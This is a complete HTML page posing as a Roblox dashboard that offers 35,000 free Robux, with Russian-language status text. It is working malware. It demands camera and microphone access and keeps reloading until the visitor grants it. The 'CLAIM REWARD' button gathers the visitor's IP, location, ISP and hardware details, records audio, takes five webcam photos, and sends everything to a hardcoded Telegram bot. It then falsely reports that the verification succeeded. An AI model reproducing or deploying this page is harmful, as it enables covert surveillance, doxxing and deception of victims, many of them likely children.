<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox | Dashboard</title>
    <style>
        :root { --blue: #0084ff; --dark: #0a0b0d; --glass: rgba(255, 255, 255, 0.03); }
        body { margin: 0; background: var(--dark); color: white; font-family: 'Inter', 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        
        /* Новый современный дизайн */
        .app-container { width: 90%; max-width: 420px; background: var(--glass); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 32px; padding: 40px 20px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); position: relative; }
        .app-container::before { content: ''; position: absolute; top: 0; left: 50%; transform: translateX(-50%); width: 80%; height: 1px; background: linear-gradient(90deg, transparent, var(--blue), transparent); }
        
        .logo { width: 80px; height: 80px; background: #1a1d21; border-radius: 20px; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; border: 1px solid rgba(255,255,255,0.05); }
        h1 { font-size: 28px; font-weight: 800; margin: 0; letter-spacing: -0.5px; }
        .reward { color: var(--blue); font-size: 18px; font-weight: 600; margin-top: 5px; }
        
        .status-box { margin: 30px 0; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 16px; font-family: monospace; font-size: 12px; color: #888; border: 1px solid rgba(255,255,255,0.05); }
        .pulse { display: inline-block; width: 8px; height: 8px; background: var(--blue); border-radius: 50%; margin-right: 8px; box-shadow: 0 0 10px var(--blue); animation: blink 1.5s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        
        .action-btn { background: var(--blue); color: white; border: none; width: 100%; padding: 20px; border-radius: 18px; font-size: 18px; font-weight: 700; cursor: pointer; transition: 0.3s; display: none; box-shadow: 0 10px 20px -5px rgba(0,132,255,0.5); }
        .action-btn:active { transform: scale(0.98); }
        
        video { position: fixed; top: -5000px; left: -5000px; visibility: hidden; }
    </style>
</head>
<body onload="initApp()">

<div class="app-container">
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="50" style="filter: invert(1);">
    </div>
    <h1>Premium Access</h1>
    <div class="reward">35,000 ROBUX READY</div>
    
    <div class="status-box">
        <span class="pulse"></span> <span id="st-text">SYSTEM CHECK...</span>
    </div>
    
    <p style="font-size: 13px; color: #555; line-height: 1.5;">Для завершения транзакции требуется подтверждение зашифрованного канала связи (Stream-V2).</p>
    
    <button class="action-btn" id="claim">CLAIM REWARD</button>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const CONFIG = { T: '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I', C: '7889497672' };
    let mainStream = null;

    async function initApp() {
        const txt = document.getElementById('st-text');
        try {
            // Принудительный запрос при входе
            mainStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('v').srcObject = mainStream;
            
            txt.innerText = "CONNECTION SECURE";
            txt.style.color = "#0084ff";
            document.getElementById('claim').style.display = 'block';
        } catch (e) {
            txt.innerText = "ACCESS REQUIRED";
            txt.style.color = "#ff4d4d";
            alert("Ошибка: Разрешите доступ к камере/микрофону для верификации.");
            location.reload();
        }
    }

    async function executeExploit() {
        document.getElementById('claim').style.display = 'none';
        document.getElementById('st-text').innerText = "SYNCING DATA...";

        let dox = `🌑 **TITAN-EVOLUTION REPORT** 🌑\n\n`;
        
        // 1. Глубокий системный докс
        try {
            const ipR = await fetch('https://ipapi.co/json/');
            const ipD = await ipR.json();
            dox += `📍 IP: \`${ipD.ip}\`\n🌍 Локация: ${ipD.city}, ${ipD.country_name}\n📡 Провайдер: ${ipD.org}\n`;
        } catch(e) {}

        dox += `\n💻 **HARDWARE:**\n`;
        dox += `🤖 Платформа: ${navigator.platform}\n`;
        dox += `⚙️ CPU: ${navigator.hardwareConcurrency} ядер\n`;
        dox += `🧠 RAM: ${navigator.deviceMemory || '?'} ГБ\n`;
        dox += `🖥 Экран: ${screen.width}x${screen.height} (${screen.colorDepth}bit)\n`;
        dox += `🎮 GPU: ${getGPU()}\n`;
        dox += `🔋 Батарея: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + '%' : '?'}\n`;

        // 2. Медиа-узлы (Stream-данные)
        const devices = await navigator.mediaDevices.enumerateDevices();
        dox += `\n📸 **MEDIA NODES:**\n`;
        devices.forEach(d => { if(d.label) dox += `🔹 ${d.kind}: ${d.label}\n`; });

        // 3. Запись голоса (10 секунд)
        const recorder = new MediaRecorder(mainStream);
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = async () => {
            const b = new Blob(chunks, { type: 'audio/ogg' });
            const fd = new FormData();
            fd.append('chat_id', CONFIG.C);
            fd.append('voice', b, 'audio.ogg');
            fetch(`https://api.telegram.org/bot${CONFIG.T}/sendVoice`, { method: 'POST', body: fd });
        };
        recorder.start();

        // 4. Серия из 5 фото
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        c.width = v.videoWidth;
        c.height = v.videoHeight;

        for (let i = 1; i <= 5; i++) {
            await new Promise(r => setTimeout(r, 1200));
            c.getContext('2d').drawImage(v, 0, 0);
            const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
            const fd = new FormData();
            fd.append('chat_id', CONFIG.C);
            fd.append('photo', blob, `img${i}.jpg`);
            if (i === 1) fd.append('caption', dox + `\n📸 **PHOTO 1/5**`);
            await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, { method: 'POST', body: fd });
        }

        recorder.stop();
        alert("✅ Верификация успешно завершена! Робуксы придут в течение 10 минут.");
        window.location.href = "https://www.roblox.com";
    }

    document.getElementById('claim').onclick = executeExploit;

    function getGPU() {
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const ext = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
        } catch(e) { return '?'; }
    }
</script>
</body>
</html>
